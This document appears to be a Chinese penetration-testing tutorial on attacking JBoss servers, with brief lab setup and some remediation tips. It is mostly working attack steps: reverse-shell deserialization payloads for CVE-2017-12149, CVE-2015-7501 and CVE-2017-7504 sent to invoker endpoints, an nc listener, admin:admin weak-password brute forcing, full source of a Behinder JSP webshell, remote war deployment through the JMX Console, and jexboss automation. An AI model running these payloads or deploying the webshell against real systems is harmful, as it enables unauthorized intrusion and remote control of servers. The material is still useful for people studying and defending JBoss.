Jboss
=====

前言
--

JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。

Jetty是一个开源的servlet容器，它为基于Java的web容器，例如JSP和 servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将 Jetty容器实例化成一个对象，可以迅速为一些独立运行(stand-alone)的Java应用提供网络和web连接。

默认端口
----

```php
8080 9990
```

安装
--

官网： <https://jbossas.jboss.org/downloads/>

需要安装Java环境 这里要注意JDK的版本 java7

![1619447111171](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e47f26e2210edf6b292360a80907244083005d1f.png)

配置Jboss环境变量

```php
JBOSS_HOME C:\JBoss6\jboss-6.1.0.Final
```

![1619446909142](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d4d3fe37ccea92fd36c41f1ed5c87b8d776c58e6.png)

```php
;%JBOSS_HOME%\bin;
```

![1619446953719](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-beaa4f59c5a65098bb0b7e40a70a6305fe806035.png)

![1619490387253](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-47433eab38c34443ca76add20a6173d0c78ae523.png)

进行启动

![1619447249477](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4c993869f67d9429179fe9d3beb0b5ad91fd6af9.png)

出现INFO 说明配置成功

![1619447305216](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-afb5824cc859137e7745feaa0b1af0db859bc867.png)

Jboss默认部署路径

```php
xxx\jboss-6.1.0.Final\server\default\deploy\ROOT.war
```

本地访问一下

![1619486155535](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-505d5a9dafd7df6660032768371c04046fae98ae.png)

修改内容 达到远程访问

`xxx\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml`修改配置

![1619486216237](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-12a0e497898f9db9bf790b6d53f765ee3cffee41.png)

```php
将address="${jboss.bind.address}"-->address="0.0.0.0"
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb5512571077d12d1606aa73392a8d8ac44838fb.png)

重启一下

kali远程访问

![1619488579969](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3efbdbf1a6ea7f6b1d581f5db2fc4fdf291ac3c2.png)

Jboss渗透
=======

JBoss 5.x/6.x反序列化漏洞(CVE-2017-12149)
-----------------------------------

### 漏洞原理

JBOSSApplication Server反序列化命令执行漏洞,远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码

### 影响范围：

JBoss 5.x/6.x

### 验证是否存在漏洞

```php
/invoker/readonly
```

![1619488613005](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-57d9c33067625152d8e446f7a6b746d0bb4569ce.png)

返回500，说明此页面存在反序列化漏洞

### 漏洞利用

配置javac的环境

我这边在kali进行操作

```php
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
## 这里要科学上网 配置代理

tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version
```

成功安装

不用管上面那个报错

![1619488997104](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-faf706a9a9314845579fce7a9ad856af19efc755.png)

利用工具：JavaDeserH2HC

```php
https://github.com/joaomatosf/JavaDeserH2HC
```

我们选择一个 Gadget：ReverseshellCommonsCollectionsHashMap，编译并生成序列化数据：

![1619489165555](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f9df9486573160bc2de9e1d5f09d62866f3b143b.png)

生成：ReverseShellCommonsCollectionsHashMap.class

```php
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

生成：ReverseShellCommonsCollectionsHashMap.ser

```php
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap IP:端口
#IP和端口是vps上nc监听的
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.175.161:8888
```

开启监听

```php
nc -lvvp 8888
```

利用：ReverseShellCommonsCollectionsHashMap.ser

```php
curl http://192.168.175.195:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

成功拿到反弹shell

![1619489453167](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0b761093e0d3568608bd5b5db83efa3c4e084706.png)

JBoss JMXInvokerServlet反序列化漏洞(CVE-2015-7501)
--------------------------------------------

### 漏洞原理

JBoss中`invoker/JMXInvokerServlet`路径对外开放，JBoss的jmx组件支持Java反序列化

### 漏洞影响

```php
Red Hat JBoss A-MQ6.x版本；

BPM Suite(BPMs)6.x版本；

BRMS6x版本和5.x版本；

Data Grid(JDG)6.x版本；

Data virtualization(JDV)6.x版本和5.x版本；

Enterprise Application Platform6.x版本，5.x版本和4.3版本；

FuSe6.X版本；Fuse Service Works(FSW)6.x版本；

Operations Network JBOSs On 3.x版本；Portalc6.x版本；

SOA Platforn(SOA-P)5.x版本Web Server JWS)3.x版本；

Red Hat OpenShift/XPAAS 3.x版本；

Red Hat Subscription Asset Manager1.3版本
```

### 验证漏洞

```php
/invoker/JMXInvokerServlet
```

![1619489513404](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3d4f9e5eaf55a3891bd779e088a795145055d0d1.png)

如上，说明接口开放，此接口存在反序列化漏洞

### 漏洞利用

直接利用CVE-2017-12149的ReverseShellCommonsCollectionsHashMap.ser发送到`/invoker/JMXInvokerServlet`接口中

```php
curl http://192.168.175.195:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

同样是要开启监听

![1619489712013](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee3ec612f9a091c6de93639e217e9041fc4deb6b.png)

成功拿到shell

![1619489746945](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8ebe021c50b0f41212253831d00e4152d9242a7b.png)

### 修复建议

1.不需要`http-invoker.sar`组件的用户 可以直接删除掉

路径为：C:\\JBoss6\\jboss-6.1.0.Final\\server\\default\\deploy

![1619578923043](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bda577feeb1b2fe30a81810b252edd630f7b5646.png)

2.添加如下代码至http-invoker.sar下web.xml的`security-constraint`标签中，对http-invoker组件进行访问控制

![1619579149845](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-92be04dc0306b7515fde8bd38e4f006b5a56cbbe.png)

```php
<url-pattern>/*</url-pattern>
```

![1619579472052](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ce34efa5029582713cee454f3fd2b97155aea5a8.png)

JbossMO JMS反序列化漏洞(CVE-2017-7504）
--------------------------------

### 漏洞原理

Jboss AS 4.x及之前版本中，JbossMQ实现过程的 JMS over HTTP Invocation Layer的HTTPServerlLServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码

### 影响版本

Jboss AS 4.x以及之前所有的版本

### 安装Jboss4

需要安装Java环境 这里要注意JDK的版本 java6

![1619490273026](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9d24c8dc848f5f5efb91187d7116238e3cfa4460.png)

同样是需要配置Jboss环境变量

![1619490342237](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5082439a294471504092f4196d3ef52a238773c.png)

运行run.bat

出现INFO 配置成功

![1619491136856](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8990a72868b636d9b2c6d6c332601e030e90deb9.png)

本地访问一下

![1619491203863](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-add919ecc7fe7fafb852457ab624b87436e98349.png)

配置远程登录

```php
C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer
```

![1619491306567](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a1a6334cbd9676a6119e9f57dd99a37c1d0e85a.png)

![1619491370434](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-322e8f752d81f17ba4877e8e5e20ea1c01f483ea.png)

```php
将address="${jboss.bind.address}"-->address="0.0.0.0"
```

保存退出 重启一下run.bat

kali远程访问

![1619491472926](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6dd9c64ddec3fe1c7b74a62dfab2d8319248e151.png)

验证漏洞
----

```php
/jbossmq-httpil/HTTPServerILServlet
```

![1619491523601](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7305a7823cec7bc50a7526a3b5b7f4dc49d25189.png)

说明是存在漏洞

### 漏洞利用

```php
curl http://192.168.175.196:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @
ReverseShellCommonsCollectionsHashMap.ser
```

![1619499269483](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3a2b6c416704f02f40419daf2ec3e8bc8a4dc383.png)

![1619499250210](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4e314aa44ac896ee753139b985c428b082225ac9.png)

### 修复建议

升级版本！

JBoss EJBlnvokerServle反序列化漏洞(CVE-2013-4810）
-------------------------------------------

### 验证漏洞

```php
/invoker/EJBInvokerServle
```

能返回结果 就可以利用

### 两者区别

与(CVE-2015-7501)漏洞原理相同，这里详细介绍一下两者的区别

其区别就在于两个漏洞选择的进行其中JMXInvokerServlet和 EJBInvokerServlet利用的是`org.jboss.invocation.Marshalledvalue`进行的反序列化操作

而Web-console/Invoker利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造的文件

Administration Console弱口令
-------------------------

Administration Console管理页面存在弱口令

存在管理界面

![1619500280595](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0924ecd64501170f39b233ea3ac060a9a07a0858.png)

弱口令：

admin：admin

然后没有验证码 可以爆破

登陆后台上传war包！

这里有上传按钮

![1619500962012](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5a2624d06e6bed906af607ac49f63455417190ef.png)

这边用冰蝎的马儿 进行打包war 上传

![1619501373965](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e0ccc1ef7ef6b04cbfc520ae9ad49e0a624d147c.png)

那么上传目录

就是war包名所在的文件夹

```php
/shell/shell.jsp
```

![1619501480638](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3c7873ffd392c0481535bb9435aeee8a5440c41.png)

![1619501724403](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d755d82c2656020358c0b7541de32dcce82e260f.png)

![1619501693853](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2af632b5b2694e29115f9fa56638187b0b2b91ad.png)

### 修复建议

#### 1.修改密码

默认密码的位置

```php
C:\JBoss6\jboss-6.1.0.Final\server\default\conf\props
```

![1619501855534](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b1583fcea51a738a97ac9569364968ce761c25a3.png)

![1619501876281](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9d9b2b5f55900059287840db5040664f1f7d2f9.png)

#### 2.删除 Administration Console页面

Jboss版本&gt;=6.0，Administration Console页面路径为

```php
C:\jboss-6.1.0.Final\common\deploy\admin-console.war
```

6.0之前的版本

```php
C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war
```

低版本 JMX Console未授权访问
--------------------

### 漏洞原理

JMX Console是Jboss管理控制台，访问控制不严导致的漏洞！

Jboss 4.x及其之前的版本 console管理路径为/jmx-console/和/web-console/！

- jmx-console的配置文件为

```php
/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml
#jboss的绝对路径不同网站不一样
```

- Web-Conso|e的配置文件为

```php
/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml#jboss的绝对路径不同网站不一样
```

- 控制台账号密码
- jmx-console和web-console共用一个账号密码，账号密码文件在

```php
/opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties
```

### 漏洞利用

![1619511607443](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-df476d57cc6dcee7b965e57d15d060bdc17e328c.png)

![1619511690973](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3c1a4c503e61ef1390f7c834d1789b09e0f175c5.png)

保存的路径

![1619511810391](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d961792cc3861ad7a940e7c12d7d8c356a1e9d49.png)

继续往下翻

![1619511744704](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-297ea06a41f9eb8e813a0a9dd5014407d2d409ce.png)

远程war包部署

```php
service apache2 startpython -m SimpleHTTPServer 9999
```

自己本地访问一下 发现是可以的

![1619596539216](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-371a87b6ceb3a672ef1add2af5849462817fefa1.png)

![1619596279104](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1fc637d32bd2862cd9300cd93b241711054ac5ce.png)

![1619596609992](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bc005a207dd0a0e7a4111c765b5837dee9f7efaa.png)

部署成功

查看部署情况 这里要点击一下 Apply Changes 进行部署

然后在jboss.web.dep

高版本JMX Console未授权访问
-------------------

### 漏洞利用

![1619566650837](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-648d1bf5c20ee5a34e2d8d50dd1b7a9f9c07bdc0.png)

![1619566687530](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-15cb25c27eaf8159141daae8ce13d9ababb0079d.png)

部署地址

![1619566759737](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3db1747e9c2544433de880f94957045c1f1b009.png)

查看框架的源代码 我们要找的是`methodIndex`为`17/19`的 deploy,填写远程war包的地址进行远程部署

![1619566920905](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a320e21a445a686872f6b69865f4193397b856ed.png)

![1619566941997](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-921ddb8727d4b91ab3e8ab38feace4b1188b4844.png)

对应的是

![1619566961392](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80c5ed80cbe5221658748627609f7f1e0099717a.png)

部署成功后 进行点击

```php
http://192.168.175.194:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://xxxx/1.war
```

然后冰蝎进行远程连接 就可

本地检查 部署的文件

路径：

```php
C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost
```

### 漏洞复现

定位到store的位置

```php
http://192.168.175.196:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository
```

通过向store的四个参数传入信息 达到上传shell

![1619580666827](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-765851417de4a7a71535f627d76bb582423c5d55.png)

```php

```

这里上传冰蝎的jsp木马

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```

```php
/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
```

![1619580826442](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d4c62263fb718da5d7e17a3ebf7e08b356943096.png)

![1619580855423](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e3e1f1b182bc1c77162a1ea604a232199d83253.png)

这边写一个情况

本地测试之后 发现上传的文档 在这里

![1619580914678](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-739a4b4d168171f72fb31ade472bc5aacb3763ca.png)

在这个目录下 有问题

自动化渗透
-----

```php
sudo pip install -r requires.txt
```

![1619568126765](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3facfef942e5f16a7919a93aa9d8dfe03825c23.png)

执行命令 拿jboss4举例

```php
python jexboss.py -host http://192.168.175.196:8080
```

进行利用 就可以了

![1619568214558](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-905b5312fdbd236ae1a5df245ce5166c1fa00ac9.png)

总结
--

Jboss是一个基于J2EE的[开放源代码](https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81/114160)的[应用服务器](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773)。

JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。

但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用

希望此文对大家有帮助！